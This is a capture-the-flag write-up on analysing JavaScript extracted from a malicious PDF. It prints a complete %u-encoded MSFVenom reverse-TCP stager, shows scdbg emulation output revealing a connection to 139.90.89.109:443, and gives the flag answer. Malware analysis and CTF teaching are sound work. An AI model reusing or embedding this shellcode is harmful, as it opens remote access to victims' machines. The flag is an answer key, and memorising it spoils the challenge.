### JS

> **Challenge Description:** The analyst team has extracted a code from a JS file for us from a malicious PDF. Please analyze the code and provide us the IP and port that it connects to.
>
> **Flag Format:** `ihack{IP:PORT}`
>
> **Hint:** Payload is generated using MSFVenom

### Solution

At first glance, the payload is Unicode encoded due to the appearance of `%u`. 

````
%ue8fc%u008f%u0000%u8960%u31e5%u64d2%u528b%u8b30%u0c52%u528b%u3114%u0fff%u4ab7%u8b26%u2872%uc031%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%u7549%u52ef%u528b%u5710%u428b%u013c%u8bd0%u7840%uc085%u4c74%ud001%u488b%u8b18%u2058%ud301%u8550%u74c9%u493c%u348b%u318b%u01ff%u31d6%uc1c0%u0dcf%u01ac%u38c7%u75e0%u03f4%uf87d%u7d3b%u7524%u58e0%u588b%u0124%u66d3%u0c8b%u8b4b%u1c58%ud301%u048b%u018b%u89d0%u2444%u5b24%u615b%u5a59%uff51%u58e0%u5a5f%u128b%u80e9%uffff%u5dff%u3368%u0032%u6800%u7377%u5f32%u6854%u774c%u0726%ue889%ud0ff%u90b8%u0001%u2900%u54c4%u6850%u8029%u006b%ud5ff%u0a6a%u8b68%u595a%u686d%u0002%ubb01%ue689%u5050%u5050%u5040%u5040%uea68%udf0f%uffe0%u97d5%u106a%u5756%u9968%u74a5%uff61%u85d5%u74c0%uff0a%u084e%uec75%u67e8%u0000%u6a00%u6a00%u5604%u6857%ud902%u5fc8%ud5ff%uf883%u7e00%u8b36%u6a36%u6840%u1000%u0000%u6a56%u6800%ua458%ue553%ud5ff%u5393%u006a%u5356%u6857%ud902%u5fc8%ud5ff%uf883%u7d00%u5828%u0068%u0040%u6a00%u5000%u0b68%u0f2f%uff30%u57d5%u7568%u4d6e%uff61%u5ed5%uff5e%u240c%u850f%uff70%uffff%u9be9%uffff%u01ff%u29c3%u75c6%uc3c1%uf0bb%ua2b5%u6a56%u5300%ud5ff
````

However, the payload was actually generated by MSFVenom`js_le` using the format. Analyze the shellcode in `scdbg` to reveal the IP address and port.

```
Loaded 426 bytes from file C:\Users\JesusCries\Desktop\js-extracted.js
Detected %u encoding input format converting...
to bin..
Byte Swapping %u encoded input buffer..
Initialization Complete..
Max Steps: 2000000
Using base offset: 0x401000

4010aa  LoadLibraryA(ws2_32)
4010ba  WSAStartup(190)
4010d7  WSASocket(af=2, tp=1, proto=0, group=0, flags=0)
4010e3  connect(h=42, host: 139.90.89.109 , port: 443 ) = 71ab4a07
4010fe  recv(h=42, buf=12fc5c, len=4, fl=0)
401141  closesocket(h=42)
4010d7  WSASocket(af=2, tp=1, proto=0, group=0, flags=0)

Stepcount 2000001
```

**Flag:** `ihack{139.90.89.109:443}`
